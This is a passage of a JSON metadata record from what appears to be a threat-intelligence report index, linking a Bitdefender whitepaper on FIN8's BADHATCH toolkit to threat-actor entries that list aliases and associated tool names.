            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.03.10.FIN8_BADHATCH_Toolkit/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf",
        "https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
    ],
    "report_names": [
        "Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN",
        "Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
    ],
    "threat_actors": [
        {
            "id": "72d09c17-e33e-4c2f-95db-f204848cc797",
            "created_at": "2022-10-25T15:50:23.832551Z",
            "updated_at": "2025-03-27T02:00:55.554841Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "FIN8",
                "Syssphinx"
            ],
            "source_name": "MITRE:FIN8",
            "tools": [
                "BADHATCH",
                "PUNCHBUGGY",
                "Ragnar Locker",
                "PUNCHTRACK",
                "dsquery",
                "Nltest",
                "Sardonic",
                "PsExec",
                "Impacket"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fc80a724-e567-457c-82bb-70147435e129",
            "created_at": "2022-10-25T16:07:23.624289Z",
            "updated_at": "2025-03-27T02:02:09.892602Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK 113",
                "Syssphinx"
            ],
            "source_name": "ETDA:FIN8",
            "tools": [
                "ALPHV",
                "ALPHVM",
                "BadHatch",
                "BlackCat",
                "Noberus",
                "PSVC",
                "PUNCHTRACK",
                "PoSlurp",
                "Powersniff",
                "PunchBuggy",
                "Ragnar Locker",
                "RagnarLocker",
                "Sardonic",
                "ShellTea"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5bdde906-0416-42ee-9100-5ebd95dda77a",
            "created_at": "2023-01-06T13:46:38.601977Z",
            "updated_at": "2025-03-27T02:00:02.870694Z",
            "deleted_at": null,
            "main_name": "FIN8",
            "aliases": [
                "ATK113",
                "G0061"
            ],
            "source_name": "MISPGALAXY:FIN8",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041382,
    "ts_creation_date": 1615378730,
    "ts_modification_date": 1615378738,
    "files": {
        "pdf": "https://archive.orkl.eu/412f70c02f7582ed56e48d5ab2fb62d5fc37c064.pdf",
        "text": "https://archive.orkl.eu/412f70c02f7582ed56e48d5ab2fb62d5fc37c064.txt",
        "img": "https://archive.orkl.eu/412f70c02f7582ed56e48d5ab2fb62d5fc37c064.jpg"
    }
}